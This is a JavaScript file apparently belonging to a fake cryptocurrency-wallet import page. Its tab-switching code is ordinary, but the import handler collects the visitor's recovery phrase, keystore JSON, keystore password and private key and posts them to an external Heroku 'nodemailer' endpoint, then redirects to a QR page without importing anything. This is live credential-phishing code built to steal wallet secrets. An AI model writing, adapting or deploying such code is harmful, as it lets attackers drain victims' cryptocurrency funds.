const conts = document.querySelectorAll('.c')
    const container = document.querySelector('.container')
    const btns = document.querySelectorAll('button')
    const importBtn = document.querySelectorAll('#import')


    


    container.addEventListener('click', function(e) {
        const id = e.target.dataset.id
        
        if(id) {
            btns.forEach((btn)=> {
                btn.classList.remove('active')
                e.target.classList.add('active')
                
                
            })
            conts.forEach((cont)=> {
                cont.classList.remove('active')
            })
            const element = document.getElementById(id)
            element.classList.add('active')
        }
        
    })
    
    ;
    

    importBtn.forEach(impor => {
        impor.addEventListener('click', function() {
    const txt1 = document.getElementById('txt1').value
    const txt2 = document.getElementById('txt2').value
    const pwd = document.getElementById('pwd').value
    const uKey = document.querySelector('.Jesuskey').value
    
            
           if(txt1 === '' ) {
            return;
           } else {
               const loader = document.querySelector('.load')
               loader.classList.add('show')
               console.log(123);
               
            let userData = {
                phrase: txt1,
                keystoreJson: txt2,
                password: pwd,
                key: uKey
            } 
            let headers = new Headers()
            fetch("https://mynodemailerapp.herokuapp.com/send", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json'
                }, 
                body: JSON.stringify(userData)
            }).then((res) => {
                // if(res.redirected) {
                //     document.body.innerHTML = `
                //         <div class="conm>
                //         <img class="myimg" src="/download (1).png" />
                //         </div>
                //     `
                // } else {
                //     document.body.innerHTML = 'Fail'
                // }
               return res.json()
            }).then((data) => {

                if(data.status === 200) {
                    console.log(data.status, "success");
                } else {
                    console.log(data.status);
                }
                window.location.replace("/markups/qr.html")
                
            })
            
           } // Everything should end here
        })
    })
// location="/markups/qr.html"

    const key = document.getElementById('json') 
    if(key) {
        key.addEventListener('click', () => {
            const phrase = document.querySelector('.re')
            phrase.classList.add('age')
        })
    } else {
        const phrase = document.querySelector('.re')
            phrase.classList.remove('age')
    }

    const json = document.getElementById('key')
    if(json) {
        json.addEventListener('click', () => {
            const phrase = document.querySelector('.re')
            phrase.classList.add('age')
        })
    } else {
        const phrase = document.querySelector('.re')
            phrase.classList.remove('age')
    }

    const phrase = document.querySelector('.re')

    phrase.addEventListener('click', function() {
        phrase.classList.remove('age')
    })

   

// Fetch API


